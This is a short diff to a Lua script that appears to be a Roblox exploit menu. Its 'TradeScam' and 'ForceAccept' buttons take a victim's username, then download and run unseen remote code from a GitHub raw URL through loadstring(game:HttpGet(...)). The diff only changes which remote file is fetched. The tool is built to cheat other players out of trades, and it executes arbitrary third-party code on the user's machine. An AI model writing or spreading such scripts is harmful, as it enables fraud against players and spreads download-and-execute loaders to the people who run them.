@@ -37,7 +37,7 @@ TradeScamTab:AddButton({
     Callback = function()
         if _G.TradeScamEnabled and _G.VictimUsername then
             print("Scamming", _G.VictimUsername, "... 💸")
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/6d871d22525dcdd8e338368a.lua'))()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/67e3e591bdc937419f9ce29e.lua'))()
         else
             print("Please enable the scam toggle and enter a username.")
         end
@@ -67,7 +67,7 @@ ForceAcceptTab:AddButton({
     Callback = function()
         if _G.ForceAcceptVictim then
             print("Forcing trade with", _G.ForceAcceptVictim, "... 🚀")
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/6d871d22525dcdd8e338368a.lua'))()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/67e3e591bdc937419f9ce29e.lua'))()
         else
             print("Please enter a username.")
         end
